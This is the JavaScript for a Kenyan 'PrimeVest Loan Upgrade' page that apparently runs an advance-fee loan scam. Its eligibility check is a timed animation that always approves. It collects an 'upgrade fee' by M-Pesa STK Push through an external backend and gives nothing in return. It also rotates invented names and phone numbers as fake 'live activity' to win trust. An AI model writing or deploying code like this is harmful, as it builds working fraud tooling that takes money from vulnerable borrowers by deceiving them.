// ======================================
// PRIMEVEST LOAN UPGRADE
// Part 1
// ======================================

// =======================
// LOAN OPTIONS
// =======================

const loans = [
    { amount: "KSh 1,000", fee: "KSh 100" },
    { amount: "KSh 2,000", fee: "KSh 200" },
    { amount: "KSh 3,000", fee: "KSh 300" },
    { amount: "KSh 5,000", fee: "KSh 500" },
    { amount: "KSh 10,000", fee: "KSh 1,000" },
    { amount: "KSh 20,000", fee: "KSh 2,000" },
    { amount: "KSh 30,000", fee: "KSh 3,000" },
    { amount: "KSh 50,000", fee: "KSh 5,000" },
    { amount: "KSh 70,000", fee: "KSh 7,000" }
];

// =======================
// SMARTPAY BACKEND
// =======================

const API_BASE_URL = "https://smartpaypesa-backend-1.onrender.com";

// =======================
// ELEMENTS
// =======================

const page1 = document.getElementById("page1");
const page2 = document.getElementById("page2");
const page3 = document.getElementById("page3");

const phone = document.getElementById("phone");
const checkBtn = document.getElementById("checkBtn");

const loader = document.getElementById("loader");
const popup = document.getElementById("successPopup");
const continueBtn = document.getElementById("continueBtn");

const loanList = document.getElementById("loanList");

const loanAmount = document.getElementById("loanAmount");
const loanFee = document.getElementById("loanFee");

const stkPhone = document.getElementById("stkPhone");

const payBtn = document.getElementById("payBtn");
const paymentStatus = document.getElementById("paymentStatus");

const steps = document.querySelectorAll(".step");

let customerPhone = "";

// =======================
// FORMAT PHONE NUMBER
// =======================

function formatPhone(value) {

    value = value.replace(/\D/g, "");

    if (value.startsWith("07")) {
        return "254" + value.substring(1);
    }

    if (value.startsWith("01")) {
        return "254" + value.substring(1);
    }

    if (value.startsWith("7")) {
        return "254" + value;
    }

    if (value.startsWith("1")) {
        return "254" + value;
    }

    if (value.startsWith("254")) {
        return value;
    }

    return null;

}

// =======================
// CHECK ELIGIBILITY
// =======================

checkBtn.addEventListener("click", () => {

    customerPhone = formatPhone(phone.value);

    if (!customerPhone) {

        alert("Enter a valid Safaricom M-Pesa number.");
        return;

    }

    loader.style.display = "flex";

    setTimeout(() => {

        loader.style.display = "none";
        popup.style.display = "flex";

    }, 2500);

});

// =======================
// CONTINUE
// =======================

continueBtn.addEventListener("click", () => {

    popup.style.display = "none";

    page1.classList.remove("active");
    page2.classList.add("active");

    steps[0].classList.remove("active");
    steps[1].classList.add("active");

});

// =======================
// CREATE LOAN CARDS
// =======================

loans.forEach((loan) => {

    const card = document.createElement("div");

    card.className = "loan-card";

    card.innerHTML = `
        <div class="loan-info">
            <h3>${loan.amount}</h3>
            <span>Upgrade Fee: ${loan.fee}</span>
        </div>

        <button class="upgrade-btn">
            UPGRADE →
        </button>
    `;

    card.querySelector("button").addEventListener("click", () => {

        page2.classList.remove("active");
        page3.classList.add("active");

        steps[1].classList.remove("active");
        steps[2].classList.add("active");

        loanAmount.textContent = loan.amount;
        loanFee.textContent = loan.fee;

        stkPhone.value = customerPhone;

    });

    loanList.appendChild(card);

});

// =======================
// AMOUNT CLEANER
// =======================

function toPlainAmount(value) {

    return Number(
        String(value).replace(/[^\d]/g, "")
    );

}
// =======================
// PAY BUTTON
// =======================

payBtn.addEventListener("click", async () => {

    const phoneNumber = formatPhone(stkPhone.value.trim());
    const amount = toPlainAmount(loanFee.textContent);

    if (!phoneNumber) {

        paymentStatus.style.color = "red";
        paymentStatus.innerHTML = "Enter a valid Safaricom M-Pesa number.";
        return;

    }

    if (!amount || amount < 1) {

        paymentStatus.style.color = "red";
        paymentStatus.innerHTML = "Invalid payment amount.";
        return;

    }

    payBtn.disabled = true;

    paymentStatus.style.color = "#0d6efd";
    paymentStatus.innerHTML = "Sending STK Push...";

    try {

        const response = await fetch(`${API_BASE_URL}/api/payment`, {

            method: "POST",

            headers: {
                "Content-Type": "application/json"
            },

            body: JSON.stringify({

                phone: phoneNumber,
                amount: amount

            })

        });

        const data = await response.json();

        if (!response.ok || !data.success) {

            payBtn.disabled = false;

            paymentStatus.style.color = "red";
            paymentStatus.innerHTML =
                data.message || "Unable to initiate payment.";

            return;

        }

        paymentStatus.style.color = "#0ba84b";
        paymentStatus.innerHTML =
            "✅ STK Push sent successfully.<br>Complete payment on your phone.";

        pollPaymentStatus(data.checkout_request_id);

    }

    catch (error) {

        console.error(error);

        payBtn.disabled = false;

        paymentStatus.style.color = "red";
        paymentStatus.innerHTML =
            "Unable to connect to payment server.";

    }

});

// =======================
// PAYMENT STATUS CHECK
// =======================

function pollPaymentStatus(checkoutRequestId) {

    let attempts = 0;

    const timer = setInterval(async () => {

        attempts++;

        if (attempts >= 40) {

            clearInterval(timer);

            payBtn.disabled = false;

            paymentStatus.style.color = "red";
            paymentStatus.innerHTML =
                "Payment verification timed out.";

            return;

        }

        try {

            const response = await fetch(
                `${API_BASE_URL}/api/local/${checkoutRequestId}`
            );

            const data = await response.json();

            console.log("Payment Status:", data);

            if (data.status === "PENDING") {

                return;

            }

            clearInterval(timer);

            payBtn.disabled = false;

            if (data.status === "COMPLETED") {

                paymentStatus.style.color = "#0ba84b";

                paymentStatus.innerHTML = `
                    ✅ Payment Successful!<br>
                    Receipt: ${data.receipt || "Confirmed"}
                `;

                setTimeout(() => {

                    alert("Loan upgrade payment received successfully.");

                    window.location.href = "index.html";

                }, 2000);

            }

            else if (data.status === "FAILED") {

                paymentStatus.style.color = "red";

                paymentStatus.innerHTML =
                    data.resultDesc || "Payment Failed.";

            }

            else {

                paymentStatus.style.color = "orange";

                paymentStatus.innerHTML =
                    "Waiting for payment confirmation...";

            }

        }

        catch (error) {

            console.error(error);

            clearInterval(timer);

            payBtn.disabled = false;

            paymentStatus.style.color = "red";

            paymentStatus.innerHTML =
                "Unable to verify payment.";

        }

    }, 3000);

}
// =======================
// LIVE ACTIVITY
// =======================

const names = [
    "Brian O.",
    "James M.",
    "Kevin K.",
    "Faith N.",
    "Mercy A.",
    "John K.",
    "Peter O.",
    "Susan W.",
    "Dennis M.",
    "Grace N."
];

const actions = [
    "boosted",
    "increased",
    "raised"
];

function randomPhone() {

    const prefixes = [
        "071",
        "072",
        "073",
        "074",
        "075",
        "076",
        "077",
        "078",
        "079",
        "011"
    ];

    const prefix =
        prefixes[Math.floor(Math.random() * prefixes.length)];

    const first =
        Math.floor(Math.random() * 900) + 100;

    const last =
        Math.floor(Math.random() * 900) + 100;

    return `${prefix}${first}***${last}`;

}

function showActivity() {

    const name =
        names[Math.floor(Math.random() * names.length)];

    const action =
        actions[Math.floor(Math.random() * actions.length)];

    const activity =
        document.getElementById("activityText");

    if (!activity) return;

    activity.innerHTML =
        `${name} (${randomPhone()}) ${action} their limit just now`;

}

showActivity();

setInterval(showActivity, 7000);

// =======================
// AUTO FORMAT PHONE INPUTS
// =======================

function formatKenyanPhone(value) {

    let digits = value.replace(/\D/g, "");

    if (digits.startsWith("0")) {

        digits = "254" + digits.substring(1);

    }

    else if (
        digits.startsWith("7") ||
        digits.startsWith("1")
    ) {

        digits = "254" + digits;

    }

    return digits.substring(0, 12);

}

function attachPhoneFormatter(id) {

    const input =
        document.getElementById(id);

    if (!input) return;

    input.addEventListener("input", () => {

        input.value =
            formatKenyanPhone(input.value);

    });

}

attachPhoneFormatter("phone");
attachPhoneFormatter("stkPhone");

// =======================
// AMOUNT CLEANER
// =======================

function toPlainAmount(value) {

    return Number(
        String(value).replace(/[^\d]/g, "")
    );

}

// =======================
// PAGE READY
// =======================

document.addEventListener("DOMContentLoaded", () => {

    console.log("==================================");
    console.log("PrimeVest Loan Upgrade");
    console.log("SmartPay Backend Connected");
    console.log(API_BASE_URL);
    console.log("==================================");

});
